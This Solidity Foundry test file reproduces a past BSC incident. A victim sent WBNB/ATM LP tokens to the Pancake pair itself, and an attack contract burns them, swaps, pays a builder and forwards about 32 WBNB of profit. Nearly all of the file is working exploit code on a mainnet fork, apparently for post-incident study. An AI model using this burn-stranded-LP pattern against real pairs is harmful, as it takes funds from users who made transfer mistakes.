// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 1,603.99 WBNB
// Attacker : 0x0eb4075c87ccd23a7ae1e00d77b043e4e8cc5894
// Attack Contract : 0x48b549e6b551c151bd392bb9acab1f88263adf48
// Vulnerable Contract : 0x9753a64fb7c233fdc43f04dab9cca88e1e229eba
// Victim : 0xbe8351c14e5108a57a545dfa8669fa31aa6adc68
// Attack Tx : https://bscscan.com/tx/0x4e9f3dc3ce3c0a6aa19dae0f1384ff46e801b433b7e3bc4c780de486db6c950a
// Liquidity Setup Tx : https://bscscan.com/tx/0x2bb7f486730d7d6a271a2a0c18cec45c89f447a95e956415f18d2a0671ec789c
// Victim LP Transfer Tx : https://bscscan.com/tx/0x5c27edc326e38641d8ce6093cd7f15ae5fca039f5fb988b7f10cb432e6e3a056

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x9753a64fb7c233fdc43f04dab9cca88e1e229eba#code

// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/2068993748936151209
//
// Victim 0xbe83 first added WBNB/ATM liquidity, then mistakenly transferred the resulting LP tokens
// to the pair itself. Because Pancake V2 burn redeems pair-held LP balance, the bot could burn that LP,
// receive the underlying WBNB and ATM, pay most WBNB as native BNB to the builder, and keep the rest.

address constant ATTACKER = 0x0EB4075C87cCD23a7AE1E00D77B043e4e8cC5894;
address constant LP_OWNER = 0xBE8351C14e5108A57A545DFA8669Fa31aA6aDC68;
address constant ATM_WBNB_PAIR = 0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant ATM_TOKEN = 0xFdC76B8b2F775656E8A867FcC3282c969D2d86b0;
address constant FINAL_PROFIT_RECEIVER = 0xfBa52f861E79C46333A308ba8f86bf136A44B2D3;
address constant BUILDER_PAYMENT_RECEIVER = 0x1266C6bE60392A8Ff346E8d5ECCd3E69dD9c5F20;
address constant DUST_WBNB_RECEIVER = 0xa44729b6039C1A9Aa3D8e6AD063d66e7ca18B06b;

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 105_692_847;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = WBNB_TOKEN;
        attacker = FINAL_PROFIT_RECEIVER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(LP_OWNER, "Victim / mistaken LP owner");
        vm.label(ATM_WBNB_PAIR, "ATM/WBNB Pancake pair");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(ATM_TOKEN, "ATM");
        vm.label(FINAL_PROFIT_RECEIVER, "Final WBNB receiver");
        vm.label(BUILDER_PAYMENT_RECEIVER, "Builder payment receiver");
        vm.label(DUST_WBNB_RECEIVER, "Dust WBNB receiver");
    }

    function testExploit() public balanceLog {
        AtmLpBurnExploit exploit = new AtmLpBurnExploit(FINAL_PROFIT_RECEIVER);

        uint256 receiverBefore = IERC20(WBNB_TOKEN).balanceOf(FINAL_PROFIT_RECEIVER);
        uint256 pairHeldLp = IERC20(ATM_WBNB_PAIR).balanceOf(ATM_WBNB_PAIR);
        assertGt(pairHeldLp, 400_000 ether, "pair should hold mistaken LP");
        assertEq(IERC20(ATM_WBNB_PAIR).balanceOf(LP_OWNER), 0, "LP owner already sent LP");

        vm.prank(ATTACKER);
        exploit.attack();

        uint256 profit = IERC20(WBNB_TOKEN).balanceOf(FINAL_PROFIT_RECEIVER) - receiverBefore;
        assertGt(profit, 32 ether, "final receiver WBNB profit");
        assertEq(IERC20(ATM_WBNB_PAIR).balanceOf(ATM_WBNB_PAIR), 0, "pair LP burned");
    }
}

contract AtmLpBurnExploit {
    address private immutable profitReceiver;

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    receive() external payable {}

    function attack() external {
        require(msg.sender == ATTACKER, "only attacker");

        IPancakePair pair = IPancakePair(ATM_WBNB_PAIR);

        // step 1: burn the LP balance that the victim mistakenly transferred to the pair.
        (uint256 wbnbAmount, uint256 atmAmount) = pair.burn(address(this));
        require(wbnbAmount > 1600 ether, "WBNB not redeemed");
        require(atmAmount > 99_000_000 ether, "ATM not redeemed");

        // step 2: return the ATM side and reproduce the trace's WBNB dust swap.
        IERC20(ATM_TOKEN).transfer(ATM_WBNB_PAIR, atmAmount);
        uint256 wbnbDustOut = IERC20(WBNB_TOKEN).balanceOf(ATM_WBNB_PAIR) - 1;
        pair.swap(wbnbDustOut, 0, DUST_WBNB_RECEIVER, "");

        // step 3: reproduce the observed WBNB self-transfer and builder-payment split.
        uint256 wbnbBalance = IERC20(WBNB_TOKEN).balanceOf(address(this));
        IERC20(WBNB_TOKEN).transfer(address(this), wbnbBalance);

        uint256 builderPayment = 1_571_909_430_014_800_601_194;
        IWBNB(payable(WBNB_TOKEN)).withdraw(builderPayment);
        (bool success,) = payable(BUILDER_PAYMENT_RECEIVER).call{value: builderPayment}("");
        require(success, "builder payment failed");

        // step 4: forward the remaining WBNB to the trace's final profit receiver.
        IERC20(WBNB_TOKEN).transfer(profitReceiver, IERC20(WBNB_TOKEN).balanceOf(address(this)));
    }
}
